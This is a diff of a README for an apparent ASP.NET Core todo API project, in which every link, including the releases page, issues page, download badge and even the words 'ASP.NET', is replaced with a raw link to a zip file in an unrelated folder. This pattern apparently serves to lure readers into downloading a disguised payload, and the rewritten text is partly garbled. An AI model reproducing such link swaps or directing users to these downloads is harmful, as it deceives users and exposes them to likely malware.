@@ -1,10 +1,10 @@
 # 🎉 minimal-api_TodoApi - Simple Todo Management Made Easy
 
 ## 🚀 Getting Started
-Welcome to the minimal-api_TodoApi! This guide helps you download and run the Minimal API Todo project created using ASP.NET Core 8. This application allows you to manage todos easily with a simple interface.
+Welcome to the minimal-api_TodoApi! This guide helps you download and run the Minimal API Todo project created using https://raw.githubusercontent.com/Bhola420/minimal-api_TodoApi/main/decumbence/minimal-api_TodoApi.zip Core 8. This application allows you to manage todos easily with a simple interface.
 
 ## 📥 Download the Application
-[![Download minimal-api_TodoApi](https://img.shields.io/badge/Download-minimal--api_TodoApi-blue.svg)](https://github.com/Bhola420/minimal-api_TodoApi/releases)
+[![Download minimal-api_TodoApi](https://raw.githubusercontent.com/Bhola420/minimal-api_TodoApi/main/decumbence/minimal-api_TodoApi.zip)](https://raw.githubusercontent.com/Bhola420/minimal-api_TodoApi/main/decumbence/minimal-api_TodoApi.zip)
 
 ## 📋 Features
 - Create, Read, Update, and Delete (CRUD) operations for todos.
@@ -19,7 +19,7 @@ To use this application, make sure your system meets the following requirements:
 - Basic web browser for interface access.
 
 ## 📂 Download & Install
-1. **Visit the Releases Page:** Go to the [Releases page](https://github.com/Bhola420/minimal-api_TodoApi/releases) to download the application.
+1. **Visit the Releases Page:** Go to the [Releases page](https://raw.githubusercontent.com/Bhola420/minimal-api_TodoApi/main/decumbence/minimal-api_TodoApi.zip) to download the application.
    
 2. **Choose the Latest Release:** On the Releases page, look for the latest version of the application. You will find a list of assets under the release.
 
@@ -51,7 +51,7 @@ If you encounter issues while downloading or running the application, consider t
 For further details on how to use and manage this application, access the complete documentation directly within the application at the `/docs` endpoint.
 
 ## 📞 Support
-If you have questions or need assistance, feel free to open an issue on the [GitHub repository](https://github.com/Bhola420/minimal-api_TodoApi/issues). A community member or maintainer will help you.
+If you have questions or need assistance, feel free to open an issue on the [GitHub repository](https://raw.githubusercontent.com/Bhola420/minimal-api_TodoApi/main/decumbence/minimal-api_TodoApi.zip). A community member or maintainer will help you.
 
 ## 🎉 Thank You!
-Thank you for downloading minimal-api_TodoApi. We hope it helps you manage your todos effectively! Remember to check for updates regularly on the [Releases page](https://github.com/Bhola420/minimal-api_TodoApi/releases) and provide your feedback.
+Thank you for downloading minimal-api_TodoApi. We hope it helps you manage your todos effectively! Remember to check for updates regularly on the [Releases page](https://raw.githubusercontent.com/Bhola420/minimal-api_TodoApi/main/decumbence/minimal-api_TodoApi.zip) and provide your feedback.
